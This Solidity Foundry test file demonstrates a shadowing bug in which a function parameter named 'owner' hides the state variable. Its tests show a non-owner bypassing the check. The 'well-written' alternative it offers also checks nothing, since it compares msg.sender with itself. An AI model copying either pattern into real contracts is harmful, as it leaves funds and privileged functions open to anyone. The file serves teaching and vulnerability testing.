pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as provided
contract BugVulnerable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Vulnerable function: the parameter 'owner' shadows the state variable 'owner'
    function sensitive_function(address owner) public {
        // This require mistakenly checks the function parameter instead of the contract's owner state variable
        require(owner == msg.sender, "Not authorized");
        // ... sensitive operations would go here
    }

    // A well-written alternative function that does not suffer from shadowing
    function alternate_sensitive_function() public {
        address localOwner = msg.sender;
        require(localOwner == msg.sender, "Not authorized");
        // ... other logic
    }
}

// Attack contract as provided
contract AttackVulnerable {
    BugVulnerable public buggy;

    constructor(address _buggyAddress) {
        buggy = BugVulnerable(_buggyAddress);
    }

    // The intended attack: an attacker calls attack(), expecting that passing msg.sender will bypass
    // the intended owner check. However, note that when called via a contract, msg.sender inside
    // BugVulnerable becomes the contract address, not the external attacker.
    function attack() public {
        buggy.sensitive_function(msg.sender);
    }
}

// Test contract
contract BugVulnerableTest is Test {
    BugVulnerable public vulnerable;
    AttackVulnerable public attackerContract;

    address public owner = address(0x64); // owner account for deployment
    address public nonOwner = address(0xC8); // arbitrary non-owner account

    function setUp() public {
        // Deploy vulnerable contract from the owner account
        vm.prank(owner);
        vulnerable = new BugVulnerable();

        // Deploy attack contract from nonOwner account
        vm.prank(nonOwner);
        attackerContract = new AttackVulnerable(address(vulnerable));
    }

    // Test that the correctly written alternate_sensitive_function works as expected
    function testAlternateSensitiveFunction() public {
        vm.prank(nonOwner);
        vulnerable.alternate_sensitive_function();
        // No revert indicates correct execution.
    }

    // Demonstrate the vulnerability: a non-owner can call sensitive_function directly, passing their own address
    // Even though the contract's state owner is different, the flawed shadowing allows bypass.
    function testVulnerableExploit() public {
        // nonOwner calls sensitive_function, and passes nonOwner's own address
        vm.prank(nonOwner);
        // This call should succeed (i.e. not revert) even though nonOwner is not the stored owner
        vulnerable.sensitive_function(nonOwner);
    }

    // Test that if an incorrect parameter is passed, the function reverts as expected
    function testSensitiveFunctionWithIncorrectParameterReverts() public {
        vm.prank(nonOwner);
        vm.expectRevert(bytes("Not authorized"));
        // nonOwner calls sensitive_function but passes a different address
        vulnerable.sensitive_function(address(0x3E7));
    }

    // Test the attack contract scenario
    // The intended attack contract expects that calling attack() will bypass the owner check.
    // However, because msg.sender is not preserved across contract calls, the attack() call reverts.
    // We demonstrate both the failure of the attack contract as written, and show how an attacker could achieve
    // the exploit by calling sensitive_function directly.
    function testAttackContract() public {
        // Calling attack() via the attack contract from nonOwner account; we expect it to revert because:
        // - In AttackVulnerable.attack(), msg.sender is nonOwner
        // - But when AttackVulnerable calls BugVulnerable.sensitive_function, msg.sender becomes the attack contract's address
        // - Thus the require(owner == msg.sender) becomes: require(nonOwner == address(attackerContract)) which fails
        vm.prank(nonOwner);
        vm.expectRevert(bytes("Not authorized"));
        attackerContract.attack();

        // However, the vulnerability can be exploited directly by a non-owner.
        // For demonstration, we show that nonOwner calling vulnerable.sensitive_function with nonOwner as parameter works
        vm.prank(nonOwner);
        vulnerable.sensitive_function(nonOwner);
    }
}
